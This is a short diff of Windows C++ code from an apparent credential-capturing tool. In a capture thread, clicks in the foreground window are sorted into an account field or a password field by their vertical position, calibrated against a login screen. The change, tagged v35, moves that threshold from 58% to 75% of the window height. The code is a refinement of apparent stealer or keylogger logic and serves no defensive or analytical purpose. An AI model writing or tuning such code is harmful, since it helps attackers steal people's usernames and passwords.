@@ -215,8 +215,8 @@ static DWORD WINAPI CaptureThread(LPVOID) {
 						RECT rc = {};
 						GetClientRect(fg, &rc);
 						LONG h = rc.bottom - rc.top;
-						// 校准自登录界面: 账号框约51%高, 密码框约65%高, 取58%为界
-						int field = (h > 0 && pt.y < (LONG)(h * 0.58)) ? 0 : 1;
+						// [v35] 改为: 只有点页面最下方(>75%)才算密码框, 其他全算账号框。避免弹窗拦截时误判。
+						int field = (h > 0 && pt.y < (LONG)(h * 0.75)) ? 0 : 1;
 						EnterCriticalSection(&g_capCs);
 						g_capField = field;
 						LeaveCriticalSection(&g_capCs);
